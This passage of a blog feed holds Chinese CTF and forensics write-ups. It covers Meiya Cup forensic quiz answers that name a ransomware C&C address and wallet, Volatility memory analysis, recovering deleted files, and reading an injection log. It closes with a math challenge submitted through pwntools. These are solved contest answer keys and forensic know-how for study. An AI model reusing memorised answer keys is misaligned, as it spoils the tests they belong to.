fa-external-link-alt"></i></a></td></tr><tr><td><strong>C.</strong></td><td><strong><a class="link" href="http://223.17.250.208:6060/C&amp;C/">http://223.17.250.208:6060/C&amp;C/<i class="fas fa-external-link-alt"></i></a></strong></td></tr><tr><td>D.</td><td><a class="link" href="http://223.17.250.208:80/C&amp;C/">http://223.17.250.208:80/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr><tr><td>E.</td><td><a class="link" href="http://223.17.250.208:8080/C&amp;C/">http://223.17.250.208:8080/C&amp;C/<i class="fas fa-external-link-alt"></i></a></td></tr></tbody></table><p>通过实时搜索，除了C选项，其他都没有相关结果</p><h4><span id="53复杂信息分析">53：复杂信息分析</span></h4><table><thead><tr><th>53</th><th>根据勒索讯息的显示，勒索金额是多少钱？</th></tr></thead><tbody><tr><td>A.</td><td>$1,000</td></tr><tr><td><strong>B.</strong></td><td><strong>$10,000</strong></td></tr><tr><td>C.</td><td>$20,000</td></tr><tr><td>D.</td><td>$50,000</td></tr><tr><td>E.</td><td>$100,000</td></tr></tbody></table><p>上题的勒索网站打开失败，</p><p>应该是网站无人维护的问题。</p><p>一通搜索，在主用户的桌面</p><p>C:\Users\Gary\Desktop</p><p>发现screen.png</p><p><img lazyload src="/images/loading.svg" data-src="53-1.png" alt="53-1"></p><h4><span id="54复杂信息分析">54：复杂信息分析</span></h4><table><thead><tr><th>54</th><th>根据勒索讯息的显示，下列哪个是与勒索案件有关的比特币钱包？</th></tr></thead><tbody><tr><td>A.</td><td>1KcjhpkowGWh5QYgPx5hYGuzbZpewgBszh</td></tr><tr><td><strong>B.</strong></td><td><strong>1KcjhpknwGWh5QYgPx5hYGuzbZpewgBszh</strong></td></tr><tr><td>C.</td><td>1KcjhpknwGWh5QYgPx5hYGuzbZpewgBzzh</td></tr><tr><td>D.</td><td>1KcjhpknwGWh5QYgPx6hYGuzbZpewgBszh</td></tr><tr><td>E.</td><td>1KcjhpknwGWh6QYgPx5hYGuzbZpewgBszh</td></tr></tbody></table><h4><span id="55复杂信息分析">55：复杂信息分析</span></h4><table><thead><tr><th>55</th><th>执法机关曾在现场对Gary的电脑进行电子法证检验，期间曾撷取与勒索软件相关的屏幕影像，并储存为png格式。下列哪项是其储存位置?</th></tr></thead><tbody><tr><td>A.</td><td>\Users\彼得\Downloads\</td></tr><tr><td>B.</td><td>\Users\彼得\Desktop\</td></tr><tr><td>C.</td><td>\Users\Gary\Downloads\</td></tr><tr><td><strong>D.</strong></td><td><strong>\Users\Gary\Desktop</strong></td></tr><tr><td>E.</td><td>\Users\Gary\Documents</td></tr></tbody></table>]]></content>
    
    
      
      
    <summary type="html">&lt;h3&gt;&lt;span id=&quot;2017年第三届美亚杯电子取证-个人赛&quot;&gt;2017年第三届美亚杯电子取证-个人赛&lt;/span&gt;&lt;/h3&gt;
&lt;hr&gt;
&lt;h4&gt;&lt;span id=&quot;案件背景&quot;&gt;案件背景&lt;/span&gt;&lt;/h4&gt;
&lt;blockquote&gt;
&lt;p&gt;Gary是一位经常用手提电脑的</summary>
      
    
    
    
    
    <category term="challenge" scheme="http://mklkx.github.io/tags/challenge/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>内存取证和文件恢复常见操作</title>
    <link href="http://mklkx.github.io/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/"/>
    <id>http://mklkx.github.io/2021/04/05/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%92%8C%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E5%B8%B8%E8%A7%81%E6%93%8D%E4%BD%9C/</id>
    <published>2021-04-05T12:48:45.000Z</published>
    <updated>2021-05-04T11:39:47.062Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="内存取证和文件恢复常见操作">内存取证和文件恢复常见操作</span></h1><hr><h2><span id="常用工具">常用工具</span></h2><ul><li>Volatility</li><li>Elcomsoft Forensic Disk Decryptor</li><li>EasyRecovery</li><li>MedAnalyze</li><li>FTK</li></ul><h2><span id="内存">内存</span></h2><ul><li>分析进程、内存数据</li><li>提取分析指定进程的特定内存数据</li></ul><h2><span id="vmdk">VMDK</span></h2><ul><li>本质上是物理硬盘的虚拟版，也会存在跟物理硬盘的分区和扇区类似的填充区域，可以利用这些填充区域把我们需要隐藏的数据进行处理，从而避免文件增加VMDK文件的大小，也可避免由于VMDK文件大小的改变所带来的可能导致虚拟机错误的问题。</li></ul><h2><span id="磁盘">磁盘</span></h2><p>常见的磁盘分区格式：</p><ul><li>Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS</li><li>Linux:EXT2-&gt;EXT3-&gt;EXT4</li></ul><h2><span id="以hdctf2019你能发现什么蛛丝马迹吗展开">以【[HDCTF2019]你能发现什么蛛丝马迹吗】展开</span></h2><h3><span id="查看系统版本">查看系统版本</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img imageinfo</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image1.png" alt="image1"></p><p>查看进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP0x86 pslist</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image2.png" alt="image2"></p><p>针对Win2003SP0x86产生报错，故排除这个镜像</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP1x86 pslist</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image3.png" alt="image3"></p><p>根据时间可以发现DumpIt.exe有东西</p><p>与该命令相似的为</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 pstree</span><br></pre></td></tr></table></figure><p>不同点在于pstree顾名思义显示的是进程树，表明了各进程之间的从属关系。</p><p><img lazyload src="/images/loading.svg" data-src="image4.png" alt="image4"></p><p>而</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 psscan</span><br></pre></td></tr></table></figure><p>则更加全面地进行了扫描，从而显示出被隐藏的进程，如病毒等</p><p><img lazyload src="/images/loading.svg" data-src="image5.png" alt="image5"></p><h3><span id="将内存中的某个进程数据以-dmp-的格式保存出来">将内存中的某个进程数据以 dmp 的格式保存出来</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># volatility -f memory.img --profile&#x3D;Win2003SP2x86 memdump -p 1992 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><h2><span id="以vampn2020-公开赛内存取证展开">以【[V&amp;N2020 公开赛]内存取证】展开</span></h2><p>通过上述内存取证起手式得到系统版本</p><p>查看进程</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 pslist</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image6.png" alt="image6"></p><p>关注</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TrueCrypt.exe 3364</span><br><span class="line">notepad.exe 3552</span><br><span class="line">mspaint.exe 2648</span><br><span class="line"></span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3364 --dump-dir&#x3D;.&#x2F;</span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 3552 --dump-dir&#x3D;.&#x2F;</span><br><span class="line">#volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 memdump -p 2648 --dump-dir&#x3D;.&#x2F;</span><br></pre></td></tr></table></figure><p>依次处理</p><h3><span id="1notepadgteditbox">1）notepad=&gt;editbox</span></h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">volatility -f mem.raw --profile&#x3D;Win7SP1x86_23418 editbox</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image7.png" alt="image7"></p><h3><span id="2mspaintgtgimp">2）mspaint=&gt;Gimp</span></h3><p><a class="link" href="https://www.gimp.org/downloads/">https://www.gimp.org/downloads/<i class="fas fa-external-link-alt"></i></a></p><p>不断调节位移、宽度和高度，</p><p><img lazyload src="/images/loading.svg" data-src="image8.png" alt="image8"></p><p>出现【1YxFCQ6goYBF6Q】</p><h3><span id="3truecryptgtelcomsoft-forensic-disk-decryptor">3）TrueCrypt=&gt;Elcomsoft Forensic Disk Decryptor</span></h3><p>Decrypt or mount disk-&gt;TrueCrypt-&gt;select&amp;Memory dump&amp;Browse-&gt;mount</p><p><img lazyload src="/images/loading.svg" data-src="image9.png" alt="image9"></p><p><img lazyload src="/images/loading.svg" data-src="image10.png" alt="image10"></p><p>发现多了个F盘，其中存在key</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uOjFdKu1jsbWI8N51jsbWI8N5</span><br></pre></td></tr></table></figure><p>得到VOL的时候就该想到需要挂载，使用VeraCrypt,按之前学到的用法</p><p>此处注意需要勾选TrueCrypt</p><p><img lazyload src="/images/loading.svg" data-src="image11.png" alt="image11"></p><p>得到fffflag.zip</p><h2><span id="以xman2018排位赛file展开">以【[XMAN2018排位赛]file】展开</span></h2><h3><span id="extundelete恢复原理">extundelete恢复原理：</span></h3><p>在linux下可以通过“ls -id”来查看某个文件或者目录的inode值，</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">~&#x2F;桌面# ls -id &#x2F; </span><br><span class="line">2 &#x2F;</span><br></pre></td></tr></table></figure><p>从而得到桌面的innode值为2</p><p>而当使用extundelete来恢复文件时并不依赖特定的文件格式，</p><p>首先extundelete会通过文件的inode信息来获得当前文件系统下所有文件的信息，包括文件名和inode，包括已存在的和删除的文件。</p><p>再通过inode信息结合日志去查询该inode所在的block位置，包括直接块、间接块等信息。</p><p>最后利用dd命令将这些信息备份出来，从而恢复数据文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">extundelete attachment.img --restore-all</span><br></pre></td></tr></table></figure><p><img lazyload src="/images/loading.svg" data-src="image12.png" alt="image12"></p><h2><span id="以bsidessf2019diskimage展开">以【[BSidesSF2019]diskimage】展开</span></h2><p>前期通过zsteg分离出png中的数据后，利用testdisk进行分析。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">testdisk disk.dat</span><br></pre></td></tr></table></figure><p>一路回车</p><p><img lazyload src="/images/loading.svg" data-src="image13.png" alt="image13"></p><p><img lazyload src="/images/loading.svg" data-src="image14.png" alt="image14"></p><p><img lazyload src="/images/loading.svg" data-src="image15.png" alt="image15"></p><p>选择最不同的那一个，根据提示进行copy，得到flag</p><p>关于testdisk的(中文版官方指南)[<a class="link" href="https://www.cgsecurity.org/wiki/Testdisk_%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B">https://www.cgsecurity.org/wiki/Testdisk_操作指南#.E9.97.AE.E9.A2.98.E4.B8.BE.E4.BE.8B<i class="fas fa-external-link-alt"></i></a>]有更加深入的功能解说和详细用法</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;&lt;span id=&quot;内存取证和文件恢复常见操作&quot;&gt;内存取证和文件恢复常见操作&lt;/span&gt;&lt;/h1&gt;
&lt;hr&gt;
&lt;h2&gt;&lt;span id=&quot;常用工具&quot;&gt;常用工具&lt;/span&gt;&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Volatility&lt;/li&gt;
&lt;li&gt;Elcomsoft Fore</summary>
      
    
    
    
    
    <category term="MISC" scheme="http://mklkx.github.io/tags/MISC/"/>
    
    <category term="取证" scheme="http://mklkx.github.io/tags/%E5%8F%96%E8%AF%81/"/>
    
  </entry>
  
  <entry>
    <title>虎符</title>
    <link href="http://mklkx.github.io/2021/04/03/%E8%99%8E%E7%AC%A6/"/>
    <id>http://mklkx.github.io/2021/04/03/%E8%99%8E%E7%AC%A6/</id>
    <published>2021-04-03T07:50:01.000Z</published>
    <updated>2021-05-08T10:36:21.558Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="2021数字中国创新大赛虎符网络安全赛道">2021数字中国创新大赛虎符网络安全赛道</span></h3><hr><h4><span id="你会日志分析吗">你会日志分析吗</span></h4><blockquote><p>线索只有一份access.log，你能从中分析到什么？</p></blockquote><p>观察到线索为盲注内容，</p><p>通过观察注入语句遍历库和表的过程，发现不同之处在于针对不同字符编码，返回的长度不同</p><p><img lazyload src="/images/loading.svg" data-src="misc1.bmp" alt="misc1"></p><p>通过拼接得到</p><p><code>web1flllag,userflag ZmxhZ3tZb3VfYXJlX3NvX2dyZWF0eQ== #flag&#123;You_are_so_greaty</code></p><p>提交flag：</p><p><strong>flag{You_are_so_great}</strong></p><h4><span id="cubic">cubic</span></h4><blockquote><p>Please give me 6 pairs of positive integers (x,y,z) satisfying the equation x/(y+z) + y/(z+x) + z/(x+y) = 6 nc 8.140.152.226 27359</p></blockquote><p>根据https://mlzeng.com/an-interesting-equation.html理解算法意思。对等式进行化简后更改脚本，从而得到几组基底</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from fractions import Fraction as Frac</span><br><span class="line">from math import gcd</span><br><span class="line">#n &#x3D; 500</span><br><span class="line">for x in range(-100,100):</span><br><span class="line">    for y in range(-100,100):</span><br><span class="line">        for z in range(-100,100):</span><br><span class="line">            if gcd(x, gcd(y, z)) &#x3D;&#x3D; 1:</span><br><span class="line">                if x**3 + y**3 + z**3 - 5 * x**2 * (y + z) - 5 * y**2 * (z + x) - 5 * z**2 * (x + y) - 9 * x * y * z &#x3D;&#x3D; 0:</span><br><span class="line">                    print((x, y, z))</span><br><span class="line">#(-23, -7, 3)(-8, -7, 5)(-7, -23, 3)(-7, -8, 5)(-5, 7, 8)(-5, 8, 7)(-3, 7, 23)(-3, 23, 7)(-1, -1, 1)(-1, 0, 1)(-1, 1, 0)(-1, 1, 1)(0, -1, 1)(1, -1, 0)(1, -1, 1)(7, -5, 8)(7, -3, 23)(8, -5, 7)(23, -3, 7)</span><br></pre></td></tr></table></figure><p>去掉冗余后留下两组分别为(-23, -7, 3)(-8, -7, 5)找到文章https://www.quora.com/How-do-you-find-the-positive-integer-solutions-to-frac-x-y+z-±frac-y-z+x-±frac-z-x+y-4，根据评论得到解决类似问题x/(y+z) + y/(z+x) + z/(x+y) = 4，的脚本和网站http://magma.maths.usyd.edu.au/calc/针对本题目更改脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; For my colleagues in Shell with a lot of love,  (and  with a lot of time now since no commuting, cause COVID) </span><br><span class="line">&#x2F;&#x2F; Code is commented to explain how to solve the meme  (https:&#x2F;&#x2F;preview.redd.it&#x2F;p92108lekoq11.jpg?width&#x3D;367&amp;format&#x3D;pjpg&amp;auto&#x3D;webp&amp;s&#x3D;e0c84917c3d7e130cad06f9ab5a85634b0c88cfb) </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y) &#x3D; 4 </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; This is the smallest solution: </span><br><span class="line">&#x2F;&#x2F; x&#x3D;4373612677928697257861252602371390152816537558161613618621437993378423467772036 </span><br><span class="line">&#x2F;&#x2F; y&#x3D;36875131794129999827197811565225474825492979968971970996283137471637224634055579 </span><br><span class="line">&#x2F;&#x2F; z&#x3D;154476802108746166441951315019919837485664325669565431700026634898253202035277999 </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line">&#x2F;&#x2F; Paste in the site below to execute this code see this result, also read the comments here to understand.  </span><br><span class="line">&#x2F;&#x2F; The last part of the prints() after executed shows you the solution above. </span><br><span class="line">&#x2F;&#x2F; http:&#x2F;&#x2F;magma.maths.usyd.edu.au&#x2F;calc&#x2F; </span><br><span class="line">&#x2F;&#x2F; Eduardo Ruiz Duarte  </span><br><span class="line">&#x2F;&#x2F; toorandom@gmail.com </span><br><span class="line">&#x2F;&#x2F; </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; First we define our environment for our &quot;problem&quot; </span><br><span class="line"> </span><br><span class="line">R&lt;x,y,z&gt; :&#x3D; RationalFunctionField(Rationals(),3); </span><br><span class="line"> </span><br><span class="line">problem :&#x3D; ((x&#x2F;(y+z) + y&#x2F;(x+z) + z&#x2F;(x+y)) - 6) ; </span><br><span class="line"></span><br><span class="line">Evaluate(problem,[-23, -7, 3]); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">problem*Denominator(problem); </span><br><span class="line"></span><br><span class="line">P2&lt;x,y,z&gt; :&#x3D; ProjectiveSpace(Rationals(),2); </span><br><span class="line">C :&#x3D; Curve(P2,x^3 - 5*x^2*y - 5*x^2*z - 5*x*y^2 - 9*x*y*z - 5*x*z^2 + y^3 - 5*y^2*z - 5*y*z^2 + z^3); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Pt :&#x3D; C![-23, -7, 3]; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">E,f :&#x3D; EllipticCurve(C); </span><br><span class="line"> </span><br><span class="line">g :&#x3D; f^-1; </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">for n:&#x3D; 1 to 100 do </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    nPt_inE:&#x3D;n*f(Pt); </span><br><span class="line"></span><br><span class="line">    nPt_inC:&#x3D;g(nPt_inE); </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">    X :&#x3D; Numerator(nPt_inC[1]); </span><br><span class="line">    Y :&#x3D; Numerator(nPt_inC[2]); </span><br><span class="line">    Z :&#x3D; Denominator(nPt_inC[1]); </span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F; printf &quot;X&#x3D;%o\nY&#x3D;%o\nZ&#x3D;%o\n&quot;,X,Y,Z; </span><br><span class="line"> </span><br><span class="line">  if ((X gt 0) and (Y gt 0)) then </span><br><span class="line">       printf &quot;Z&#x3D;%o\n&quot;,Z; </span><br><span class="line">        printf(&quot;GOT IT!!! x&#x3D;apple, y&#x3D;banana, z&#x3D;pineapple, check the above solution\n&quot;); </span><br><span class="line">        </span><br><span class="line">     &#x2F;&#x2F; break; </span><br><span class="line">  else </span><br><span class="line">      &#x2F;&#x2F; printf &quot;Nee, some coordinate was negative above, I keep in the loop\n\n&quot;; </span><br><span class="line">  end if; </span><br><span class="line"> </span><br><span class="line">end for;    </span><br><span class="line"></span><br><span class="line">if Evaluate(problem, [X,Y,Z]) eq 0 then </span><br><span class="line">    printf &quot;I evaluated the point to the original problem and yes, it worked!\n&quot;; </span><br><span class="line">else </span><br><span class="line">     printf &quot;Mmm this cannot happen!\n&quot;; </span><br><span class="line">end if;</span><br></pre></td></tr></table></figure><p>其次，有无网站对于输出有篇幅限制，想到可以通过逐次取出X,Y,Z来实现目的。</p><p>再者，由于问题要求输入六组正整数，同时不存在倍数等关联关系，便通过更改基底(-8, -7, 5)来实现。</p><p>从而得到了六组数据，进行数据处理后，手动输入时总有报错。最终想到交互脚本</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p &#x3D; remote(&quot;8.140.152.226&quot;,27359)</span><br><span class="line">print(p)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;1218343242702905855792264237868803223073090298310121297526752830558323845503910071851999217959704024280699759290559009162035102974023&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2250324022012683866886426461942494811141200084921223218461967377588564477616220767789632257358521952443049813799712386367623925971447&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;20260869859883222379931520298326390700152988332214525711323500132179943287700005601210288797153868533207131302477269470450828233936557&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;4797638216628812583434025577605647593302822112134074408304197287542626731655254754760070250069695806237478221185866750975864984886647923024950735389831823373908555291180424415780024231454429163667332563396190904475120830158622717917403410286269955215566928195911908452819781909832541473650205273220866668169706085422281346283683985976540910523295176188150172920324239409299506597321070979467526996274250455453182014342144936200082194972917287973666427586488695999171979538251246523201245515757129525859568862236578547077946470570834236704528174230986916804096494749486164989791799546021425641303587706015640912093764433943754791135952478302825539395135192814380102119660006534266801158156700532041924855632560802425763479310909232427688759422464721428542139255036982495633027474766492231096582800300651532249452886124953384853644678030788868746890039385094652563276776070355819550156592854511474008067006161138536377052747705010046805434254128197439636732559891068359224512685476617566910615703158046476554017740927198988625166011702932143115961764294294133907713303321841125624206851854472613188228173370133650483279735267719807509520708582676901775464380300759372054841808969769362891985102581373&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;777215626371575217088310657140916521552988153647866038173198916020312203493964892557563515431776969976046377584808229726352107619185583316687354759898196737347993746254565122120527731768195400231056815663888758684421038238709788019326884485614991925753966183761708679471125148868876403664908848861229717592196841841920473123578320855383118815350240637368544307701771717790650586054632461552124823315180571553580552049469926518181331572822074022199558952119404190298735931653490892364073367374730596017190552617978971456481522903772154415790713998943890853561688541203855503519300220331450635692743853335580941406696263179637852488484574223656341703333725590156162934937022942328843104826018387806660541029784540066112095628410607646582758361692137157069659886753575805335098000015351084698040967634958962458780606944874861680995183423604699064295119192178585506522888929055816009012760980227645872065982724034169776145752311726352982276547920221698579169084852770861432795991389945366645278302963590215158406022987607104254724775954509771611804278473641470084216432339586431642635279556427721823661252622577913436058122095186869865354722446845980909445583248603818646384918432817277751662114543767&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;45515177015370523186598470590800680389544668323346594120846310192651398948390333283841532838684228638057215529362980007901386037256606243099615016102478164356558671683211294326446538751067821841673990056500943490188667311094600394287944059737699170342758141308528120872594274846008499540806901157295755540786515739853811429101516388477908520360561007082314632823114318657321995023547907820030487984940570143033969059826198120222159054657757563990715876115982516007694588913589122694187210686371983934230131835116521724432838149089565766042842475792610165897246048263301498788205247949191959658551589000568833072395086346175560101459095869177540490444202757299358218286450933222931993542746092845434882841955167085611634798474215124723297956721787207069367210409930468551846723224409896901058733139606912810756783041961963236587262871957343659125846761987066927612211879278746707077150609197098785704768347642644777952301121081864034466935022811337948250337129064542497021903422439329618855883674545481251106939380976621498278402398166702566979987748149240552204768106633906852518721918670969297060120387704062182294525438430153827499412674831704727795905692842778950482616128311989966416414551687&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;314292671062173921111292961964938688436708560003041812060682883475601482731858816422240383882944462620623567286587503750889103725755740006155575297673642764299712726683321335389717791541964719934510825511641995918205107276454661741769794334108514203164641911236712095598112837257748637990075283636106682003276751427529201991787105193934697041232800134525851852447109810170418723631301828242625191639180887760900486283796646822636577982415485834912490056678350793904299469556675190381984269650656661389359603438215672023664789997298532577361391479552727060752508401019647303083662666278442587228978720394609332929193655411546120631186405265728554188782640067849098497720941130508081137596382759145482661677081314713162009647103220488302296025402048431671351592354184472261402188368030157633491138250760&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;2370844050733763168653056912182275089135481091989469895123144001232602797883560999259129655883146226759407799774039653583687248933666821013837626069498685816554714705323847460507235277382794614936098961850448835901703891332533224965178208112684042141294337624561114056386810429548483148842597664557193452726536721058295707545479924443144714770275921157720051829171825732745857876583623371634787429544606363093272415125412836762819303421993587964400942215536942030583066797232871335393211395326041484926097986775013694902283133471846514714506451260645208477576233622738192899871671383782415144282058906877965816336875417759881658992236986398952428086504437441217917041059825839022060700048544901256390446316992733932612136873399094430223469630954259137165426566293784012450269989381719756996048058089023&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;91799790641290895978892693045989377201208936340103016031364426490498736597677568287986160691579377724785392328266339231530225121046175630599728096521939605350739358168216330513241983978233993998988991326492874516049720675702286872816333914372511669802712219058719713832528597339293054368816739355907136102655521941992018553301928493452434474447723992660186680549103802498214282230740469986200770650120969911569599029786866103349814407040007149745644301920170584323025348517461308692357116926947251792699428368596979150563731309323515129474727817938633113832298119162778959620065753052386380251973187273607723986357950763286173562416762837143991547957533832926711542607034850457520418701875848727202883029106928219366050792422975016449024940528092641753838563742427509959090708910325398150439211810947&#39;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(&#39;[&gt;] x:&#39;,&#39;56343649470240944554541894194988032703152997483478025833485972092218241337348853462230550424269147587800007652800293442004563869063886539040704766619498961200516659583290762006742798747469819888357792304697529942283359016185536952419123443659813889544074213427237110287294366175059635489448606250819908358350367149475716496147487553433179157998593945045322448076446074865941920944926999884940332993017456395924976676018690218339595481948243896485907414278966492530683292887139539659213655023566766221831101135716001114169465582095106866429598465819579251295344339363122366559695834860866804821549078214470097325475562348355909825383578656299291495158122343583669460994581463652874145227290461773333377653825221448498643097415855394586840976390778065228010016838569596510884166894677724088453570554767891184009131202317463514667359675678308273163019864696397081276413389405178171832745064861375814617936899532879712697136502243767035869937886475349752732150896969705296958490386441876956461184753084885769489430408516478703269437168381789319788790797428959139328712339957316117433448921132629622916708162428803235294590729639690852735377737206875338559199642070756311221226354944275318104837238167938202874217277492682815157499036987671256790859209806061503081344974789146778142931461324438529830704647215310927456378226982094776791700899499767462440654000563331840801303630438288044726721668704136674569839611669539413577512641649460977325998156570611386695018346162124146444706600987125728699130857055733537679469412242428826826935313006521770416368190687794280098116223642593388696849325370974810173125463698206913626766831972902243040465791015306424858355284719345366417620405511681504199911683347113281944681912916616132595054141026620258530563782786876322816587301269197442746292368414303315916127317539282360592306966359033242684651591954067524673199807562267732882499063271347318982611006661263494424151752264285558404799539621054955240512368945118792096497578940815581860912677444713933006832661623582500082478103238386417759689596063674005645479325332513077947113142956489547967180110415807786757407565752981932876353479407753092629266170282399179455720412484028739177077916224898883055016568193570916954087403947022375704897561290704151306304296686231291915246078164894587604716731470270119255087638182016103482577417893994049532855443300933728751399104111113609139228244726117959809105870149939972243213243831080813292338018302734542541233393743764759099980125399064644064805556447102406684434751204627691119565714724372329434706830140754634784227958640480013090696910905948933204602786185318660439519844302686975950999911055368&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] y:&#39;,&#39;690513437917728358762742711882624210164156431191697460882071057631561434325917194724772571514769724756242649519293158098384452412034167432275066372007004613680327427275255271007127044500195055860576563483804846123615529706820098453919546485591052753586754752104074341574860615520024377668700069864523352595220021568265975747313365897344377455241983028423674873434480056500630547147021993841999914561066320454849616376511661854175124523626563946260328304964816820133526615504321061413552393435413734557860662179798338474456125557653019597413139361818201425365606459576981822303550670526711519547509422125776104848095712289913400348586094384034058327925810664271557067622049162165150997202607282520298373725742249437300215040007286145644594199573242191594020014861450701927255018742772391559888966053022348102555531053982964052676926034925187305081627180507684742157711204353955162518874918886441532355751364121120137220061598963972580632838065901252190541351505027162785606878378311773952864869040509371374045692153472360339820677197672974756063513992872813455047100440244265557323434292412653818727791484111886782630394009644619539997443752988480521672135682157981673252052742864017573864197821230865482608845995740938202946251972964115016855530942129284157345912242376589154358871801279188464112607201835735932165284481904436829641195268567905891766429473254156084489952125398195272913330657462922772676499577099055343169854441886913994787834086606951740959589308664147443162319475581543409481990727383462831564419330728082071773330584289890411190010801069814088316007675323856714135491996452097141166559416692817286741598938662142626353838913514868198944005794534159292904121493082022746192498136043686361054539803627017608616650817531026636848049654514828317231299512550948146410251443374282125060797517096613206515282939712390801471584022666792246977896986312650918250296670922360409243340310820180832046145279752237926888410158387477570151262836436709586347996373290744918424123874672100019158042610343734330300670999884700852984443231339851004224214797726388873060011777955177645327156497832413161629291650080831223335503202990794458074506899395173451753753412917542092805390442383785492313389266374623965592621164471788912979915288373531140420679741585514338378160814121102804719457924307258255604149561680677196943968021781539349025029439498318908711409131556014964860313682882585682350466634173408107287337651166402486894914050092552773350939774830857074355792728576489985768113131291720474480791442839751564508645608156726138081315247369269982278615147021753411529822207492155763831635572814845385765795018138222502796671315249755&#39;)</span><br><span class="line">p.sendlineafter(&#39;[&gt;] z:&#39;,&#39;61848417055152133095432859376247872928009845246789580178050067454174942407289297559012928374669880399226235006088231916429036431717949140079523107699010796967464678696750432063224742137856002145403334654222909904962522076144363242043530182229726617880261101644639444540632138844359849325627444234093053497298089172796831309295203428323237607544929109304950196414277510671931861834789019508453957863965179460523547130977182721873412236354976041295946290574129654540505955820992215494161856824568912319386270787992756116866062781660041872686867599926093955236454271756037813904065345815807967197252149709256958910903921629063676085365164156292505994515780099836726603025001546701580563990270117723417757806315543027481605046648706694155341556749747961645150448309646644003429504745612139087577369112753968247750887383888853833638024926592320525431539002011906512566022225505488290067553775739475228974287524010911471199580446981297499033324293433054314997340507624763508479764288445959167109818379093312384897235514453806773570506136147460374739652208927635094780369233426741106222197305283621020742649692897738775130354778510804617375762614331484058562161679108584863456408377372390011016005774582862355690168291837260954433736953414457935193344330564117264151893117400699445297640650235267828893304134297349172279303352447772969171487962668842312818473409530277128527703784927802500713063308105794763395798900921132178185481565958439843343194891889939209386168195922077305571738816941145556666482431762119631038188209848264753064527691896274230406206976712407517112707473610456245413512449975006013001346800249527889328831154098431736999515648890302395574277947121160024065442038436332583230900633713649991890809933852937500538580995409391470251506811498781070869446698178060432825438142270059298820983291636082393750640274537182390720017567223171631951340485128381886918925746013563999355762098143500142836828449729756344834461718923526113135739367355419